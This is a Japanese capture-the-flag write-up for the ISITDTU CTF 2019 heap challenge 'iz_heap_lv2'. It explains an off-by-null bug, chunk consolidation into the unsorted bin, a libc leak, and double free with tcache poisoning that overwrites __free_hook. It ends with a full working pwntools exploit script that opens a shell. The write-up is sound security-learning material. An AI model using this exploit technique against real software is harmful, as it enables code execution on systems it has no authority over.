---
tags: pwn
---

# ISITDTU CTF 2019 Quals - iz_heap_lv2

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/isitdtu-team/ISITDTU-CTF-2019>

## Writeup

### Outline

[ISITDTU CTF 2019 Quals - iz_heap_lv1](/f2kpugIfQjagRxaGy3PXAw)の強化版、[CSAW CTF 2019 Quals - Poppong Caps 2](/ImDlSf3URnSpKOMb-chZ8g)とは違い、こっちはlv1からしっかり進化している。
名前の概念が無くなりコマンドはcreate+edit, edit, delete, showの4つ。
サイズやインデックスの演算子のミスは治っていないが前問の名前のような入力を自由に置ける箇所がポインタ配列の前後から無くなった。よって任意のアドレスをfreeしたりeditすることは叶わない。
おそらく唯一の脆弱性がcreateやedit時のチャンクへの書き込みにoff-by-nullとして存在する。[(study) - off-by-one error](/@Xornet/Bk1OIIq6U)で扱ったようにヌルバイトのオーバーフローで真下のチャンクのPREV_INUSEフラグを潰すことが出来るのでfree時に結合が発生してまとめてUnsorted Binに放り込まれる。
これを利用してUnsorted Binからの切り出しからUAF(read)でlibc leak, 再確保して同じポインタが2つ生きている状態でfreeしてDouble Freeからのtcache poisoningで`__free_hook`を書き換える

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

何故かPIEが無効、デバッグ時に確保しているポインタをわかりやすくするためなのだろうか

### Binary

確保ポインタ配列の下にサイズの配列が配置された。lv1であった名前の格納部分は名前ごと消え去ったのでもうインデックス超過で任意アドレスを読むのは出来ない。
コマンドはcreate+edit, edit, delete, showの4つであり、下記脆弱性以外に特に不審な点は無い。
lv1同様deleteは硬く、free時にポインタもサイズもクリアされる(サイズは-1としてクリアされる)。
ちなみに確保できるポインタの数は最大20個、結構余裕がある。

### Vulnerability

addやedit時の書き込み時にoff-by-nullが存在する。[(study) - off-by-one error](/@Xornet/Bk1OIIq6U)の内容がようやく役に立つ。

```clike
void __write(void *pvParm1,int iParm2)

{
  read(0,pvParm1,(long)iParm2);
  if (iParm2 != 0) {
    *(undefined *)((long)pvParm1 + (long)iParm2) = 0;
  }
  return;
}
```

注意点として"書き込んだ長さ"の後にヌルバイトを足すのではなく`read`の第3引数に渡したインデックスにヌルバイトを付与するのでcreate+edit時に真下のチャンクのPREV_INUSEフラグが潰れる。だいたいtopで指定されているチャンクのサイズが潰れてしまうのでtopとのConsolidationに気を配る必要がある(下のチャンクのPREV_INUSEが落ちているせいでまとめてtopに結合される可能性がある)。

### tcache埋め

今回はUnsorted Bin経由でlibc leakしたいのでそれの妨げになるサイズのtcacheは埋めてしまう。具体的には次のようなメモリ配置からBackward Consolidationを利用してUnsorted Binへチャンクを送るのでそこに対応したサイズを埋める

```
A (size: x)   (freed, at Unsorted Bin)
B (size: s_0) (used, overflown)
C (size: y)   (used, prev_inuse: 0)
```

この状態でCをfreeする。サイズ`y`のtcacheを埋めておき、下のチャンクとの結合も発生しない状態において`PREV_INUSE`が落ちているので`prev_size`を見て前のチャンクを特定する。そして前のチャンクが何かしらのBinに入っていることを確認してから結合する。
今回はBのedit時に`prev_size`が`s_0 + x`となるようにすることでCの真上のチャンクをAであると偽装することが出来る。Aは既にUnsorted Binにあるので無事に結合が出来、これでAとBとCが結合されている状態でUnsorted Binが更新される。
もちろんだがBのポインタはまだクリアされていない。

### libc leak

A, B, Cの内、ポインタが生きているのはBだけである。よってここにUnsorted Binの先頭を持ってくれば`&main_arena->top`が読める。
この時点でUnsorted Binにはサイズ`x + s_0 + y`のチャンクが繋がっているのでサイズ`x`のチャンクを切り出すようなmallocを発動させればチャンクAに相当する部分だけがUnsorted Binから切り出され、残りはUnsorted Binにつなぎ直される。よってBのshowでlibc leakが出来る。
但し、既にサイズ`x`のtcacheにはチャンクが存在するのでtcacheをからこれらを追い出さないとUnsorted Binからは切り出されない。よって7回create+editをしてtcacheを空にする。

### いつもの

あとはいつものDouble Freeからtcache poisoningするだけだが、普通にDouble Freeは出来ない。ここで、tcacheやfastbinに無いサイズのチャンクはUnsorted Binから切り出されることを思い出すとBのチャンクをまだポインタが生きているにも関わらずもう1度別のポインタで指すことが出来る。
これらのポインタに対応するインデックスでそれぞれfreeすればDouble Freeが発生し、tcache poisoningで`__free_hook`を書き換えることが出来る。

## Code

```python
from pwn import p64, u64, process, ELF


def select(s, sel, c=b"Choice: "):
    s.recvuntil(c)
    s.sendline(str(sel))


def add(s, size, data=b"junk"):
    select(s, 1)
    s.recvuntil(b"size: ")
    s.sendline(str(size))
    s.recvuntil(b"data: ")
    s.send(data)


def delete(s, idx):
    select(s, 3)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))


def edit(s, idx, data):
    select(s, 2)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))
    s.recvuntil(b"data: ")
    s.send(data)


def show(s, idx):
    select(s, 4)
    s.recvuntil(b"index: ")
    s.sendline(str(idx))
    s.recvuntil(b"Data: ")
    return s.recvline().rstrip()


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    """
    """
        - 今回も1同様サイズとインデックスのチェックは無
        - free時にポインタはクリアされる
        - 今回はまともなshowが出来る
        - off-by-null
    """
    s = process("./iz_heap_lv2")
    libc = ELF("./libc.so.6")
    arena_libc = 0x3ebc40

    for _ in range(7):
        add(s, 0x88)

    for _ in range(7):
        add(s, 0xf8)

    add(s, 0x88)  # 14
    add(s, 0x18)  # 15
    add(s, 0xf8)  # 16
    add(s, 0x18)  # 17
    add(s, 0x18)  # 18
    add(s, 0x18)  # 19

    for i in range(14):
        delete(s, i)

    delete(s, 14)
    edit(s, 15, b"a" * 0x10 + p64(0x90 + 0x20))
    delete(s, 16)

    for _ in range(8):
        add(s, 0x88, b"/bin/sh\x00")  # 0 ~ 7

    libc_addr = u64(show(s, 15).ljust(8, b"\x00")) - arena_libc - 0x60
    print(hex(libc_addr))

    add(s, 0x18)  # 8
    delete(s, 15)
    delete(s, 8)
    add(s, 0x18, p64(libc.symbols["__free_hook"] + libc_addr))
    add(s, 0x18)
    add(s, 0x18, p64(libc.symbols["system"] + libc_addr))

    delete(s, 0)

    s.interactive()

```

## Flag

ローカルでシェル取っただけ

## 感想

初off-by-nullなので嬉しかったです。
ところでPwn担当のチームメイトと色々話していたらlibc 2.29ぐらいからこの手法に対する防衛策(おそらく`prev_size`と真上のチャンクのサイズが正しいかの確認)が実装されたらしいのでこの鮮やかな手法もしばらくしたら出題頻度が下がってしまうのでしょうか?
2.29でも可能にするなら、Overlapしている状態を上手く作る必要があるのでまた苦労が増えそうである。

## 参考文献

* [Malleus CTF Pwn](https://sanya.sweetduet.info/ctfpwn/): これの最後の問題であるstrstrstrと状況が殆ど同じ、昨年秋のPwn入門から今までずっとお世話になっている本、私のWriteupまとめを読むよりこれを読んだ方が良いです